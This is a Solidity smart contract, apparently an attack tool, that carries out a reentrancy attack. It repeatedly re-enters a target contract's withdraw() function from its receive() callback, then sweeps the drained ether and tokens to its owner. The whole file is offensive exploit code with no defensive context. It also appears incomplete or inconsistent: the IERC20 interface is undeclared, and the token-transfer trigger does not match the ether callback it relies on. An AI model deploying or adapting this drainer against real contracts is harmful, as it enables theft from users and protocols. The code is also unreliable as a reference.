// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnHunterReentrancy {
    address public owner;
    address public target;
    IERC20 public token;
    uint256 public attackCount;
    uint256 public constant MAX_REENTRANCY_DEPTH = 15;

    constructor(address _target) {
        owner = msg.sender;
        target = _target;
    }

    // Step 1: Start reentrancy attack
    function attack(address tokenAddr, uint256 amount) external {
        require(msg.sender == owner);
        token = IERC20(tokenAddr);
        attackCount = 0;
        token.approve(target, amount);
        token.transfer(target, amount);
        // The target's callback (e.g. withdraw) will call back into receive()
    }

    // Step 2: Receive callback and re-enter
    receive() external payable {
        if (attackCount < MAX_REENTRANCY_DEPTH) {
            uint256 bal = address(target).balance;
            if (bal > 0) {
                attackCount++;
                (bool s,) = target.call(abi.encodeWithSignature("withdraw()"));
                require(s, "Reentrancy call failed");
            }
        }
    }

    // Step 3: Sweep profits
    function sweepETH() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    function sweepToken(address tokenAddr) external {
        require(msg.sender == owner);
        IERC20(tokenAddr).transfer(owner, IERC20(tokenAddr).balanceOf(address(this)));
    }
}
